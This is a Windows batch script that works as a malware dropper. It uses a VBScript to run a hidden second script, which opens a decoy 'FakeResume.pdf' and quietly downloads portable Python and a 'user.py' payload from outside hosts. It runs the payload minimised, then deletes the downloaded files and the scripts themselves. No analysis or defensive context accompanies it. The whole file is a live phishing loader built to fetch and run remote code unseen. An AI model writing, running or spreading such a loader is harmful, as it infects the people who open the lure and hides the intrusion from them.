@echo off

REM Create VBScript to run everything invisibly
echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\inv.vbs"
echo WshShell.Run "cmd /c ""%temp%\exec.cmd""", 0, False >> "%temp%\inv.vbs"

REM Create the actual execution script
(
echo @echo off
echo.
echo REM Open PDF first
echo start /b powershell -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue';Invoke-WebRequest -Uri 'https://github.com/workspacehome0/download/raw/main/FakeResume.pdf' -OutFile $env:temp'\doc.pdf' -UseBasicParsing;Start-Process $env:temp'\doc.pdf'"
echo timeout /t 2 /nobreak ^>nul
echo.
echo REM Download Python portable
echo powershell -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue';Invoke-WebRequest -Uri 'https://staging.derideal.com/wp-content/app/python-portable.zip' -OutFile $env:temp'\py.zip' -UserAgent 'Mozilla/5.0' -UseBasicParsing" ^>nul 2^>^&1
echo timeout /t 3 /nobreak ^>nul
echo.
echo REM Extract Python
echo powershell -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue';Expand-Archive -Path $env:temp'\py.zip' -DestinationPath $env:temp'\py' -Force" ^>nul 2^>^&1
echo timeout /t 3 /nobreak ^>nul
echo.
echo REM Download payload
echo powershell -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue';Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/workspacehome0/download/refs/heads/main/user.py' -OutFile $env:temp'\user.py' -UseBasicParsing" ^>nul 2^>^&1
echo timeout /t 1 /nobreak ^>nul
echo.
echo REM Run Python payload ^(hidden^)
echo if exist "%temp%\py\python.exe" start /min "" "%temp%\py\python.exe" "%temp%\user.py"
echo.
echo REM Cleanup after delay
echo timeout /t 15 /nobreak ^>nul
echo del "%temp%\py.zip" 2^>nul
echo del "%temp%\user.py" 2^>nul
echo del "%temp%\doc.pdf" 2^>nul
echo del "%temp%\exec.cmd" 2^>nul
echo del "%temp%\inv.vbs" 2^>nul
echo rd /s /q "%temp%\py" 2^>nul
) > "%temp%\exec.cmd"

REM Execute via VBScript (completely invisible)
cscript //nologo "%temp%\inv.vbs"

REM Exit immediately
exit

